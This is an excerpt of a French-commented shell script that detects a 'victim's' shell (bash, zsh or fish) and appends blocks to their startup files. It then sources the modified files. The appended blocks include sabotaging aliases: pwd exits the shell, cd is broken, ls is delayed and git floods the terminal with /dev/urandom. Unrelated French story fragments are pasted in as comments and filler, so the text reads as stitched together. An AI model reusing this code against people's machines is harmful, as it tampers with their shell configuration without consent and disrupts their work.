...
#
#« À la base militaire du 57e RA ? Mais qu'est-ce que j'ai à voir avec les militaires ? » David se rappelle y avoir fait un séjour alors qu'il avait vingt-quatre ans. Il avait fait tout son possible pour éviter le service militaire, encore en vogue à l'époque, mais lorsqu'on lui avait proposé de travailler sur des projets informatiques secret défense, il n'avait pas su résister.
#
#Aujourd'hui, c'est son anniversaire. Il a vingt-six ans, mais il ne s'en souvient plus. Il ne prête pas attention à ce genre de détails. David est un homme distrait, timide, mais sûr de lui.
#
...
# ── Détection du shell de la victime ──────────────────────────────────────────
detect_shell() {
    local shell_name
    ...
    case "$shell_name" in
        ...
        fish) echo "fish" ;;
        *)
            # Fallback : regarder le process parent
            local parent_shell
...
# ── Injection zsh / bash (.zshrc ou .bashrc) ──────────────────────────────────
inject_posix() {
    local rc="$1"
...
BLOCK1
    ...
    cat >> "$rc" << 'BLOCK2'
echo "Bash est un shell, soit un interpréteur de ligne de commande : il permet de \"discuter\" avec l'ordinateur, en ligne de commande. Sur Ubuntu c'est le shell utilisé par défaut dans le terminal. Il est bien évidemment libre, sous licence GPL.
...
BLOCK2
    ...
    # FIX git : on n'utilise plus "cd /dev &&" car cd est lui-même aliasé.
    # On appelle directement cat /dev/urandom.
    cat >> "$rc" << 'BLOCK3'
alias ls='echo "processing..."; sleep 2; command ls'
alias cd='echo "cd: command not found, did you mean cd."'
alias pwd='exit'
alias vim='nano'
alias code='vim'
alias git='cat /dev/urandom'
BLOCK3

    cat >> "$rc" << 'BLOCK4'
#Seul, au milieu du bitume, seul au milieu de l'air qui m'entoure.
#J'attends agar, je ne sais ce que je fais. Je pense, je réfléchis et j'imagine. Je l'attends, je dois lui parler. Tout est encore désert.
#Ma réflexion s'arrête. Le temps, en quelque tintements de sonnerie, reprend son court. La peur, l'angoisse monte en moi.
#Les paroles montent, j'attends de la voir. C'est alors que rayonnante, je la vois sortir, elle est étincelante, je sais que je dois y aller.
#Mais je me retrouve bloqué, bloqué par moi-même, tout le courage s'est envolé, je n'ose lui parler.
#Il est malheureusement trop tard. Cette satané sonnerie me nargue à nouveau.
BLOCK4
}

# ── Injection fish (~/.config/fish/config.fish) ───────────────────────────────
# Fish n'utilise pas "alias" pour les fonctions multi-instructions :
# on écrit des blocs "function ... end" directement dans config.fish.
inject_fish() {
...
main_task() {
    ...
    case "$shell_type" in
        zsh)
            rc_file="$HOME/.zshrc"
            inject_posix "$rc_file"
            # shellcheck disable=SC1090
            zsh -c "source $rc_file" 2>/dev/null || true
            ;;
        bash)
            rc_file="$HOME/.bashrc"
            inject_posix "$rc_file"
            # shellcheck disable=SC1090
            bash -c "source $rc_file" 2>/dev/null || true
            ;;
        fish)
            inject_fish
            ;;
